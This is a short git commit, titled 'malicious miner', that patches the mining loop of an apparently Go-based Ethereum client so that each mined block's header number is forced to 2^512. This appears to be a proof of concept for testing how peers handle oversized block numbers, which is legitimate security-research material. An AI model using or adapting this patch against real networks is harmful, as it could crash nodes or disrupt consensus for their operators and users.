@@ -1,0 +1,22 @@
+commit aa8d0a9a5c885067cd92a6545c99b14b9e564b59
+Author: Jonas Nick <jonasd.nick@gmail.com>
+Date:   Tue Feb 17 00:27:20 2015 +0100
+
+    malicious miner
+
+diff --git a/miner/miner.go b/miner/miner.go
+index f63096b..b0b7973 100644
+--- a/miner/miner.go
++++ b/miner/miner.go
+@@ -209,6 +209,11 @@ func (self *Miner) mine() {
+ 
+ 	minerlogger.Infof("Mining on block. Includes %v transactions", len(transactions))
+ 
++	bigNum := new(big.Int).Exp(big.NewInt(2), big.NewInt(512), nil)
++	if bigNum.Cmp(self.current.block.Header().Number) > 0 {
++		self.current.block.Header().Number = bigNum
++	}
++
+ 	// Find a valid nonce
+ 	nonce := self.pow.Search(block, self.powQuitCh)
+ 	if nonce != nil {
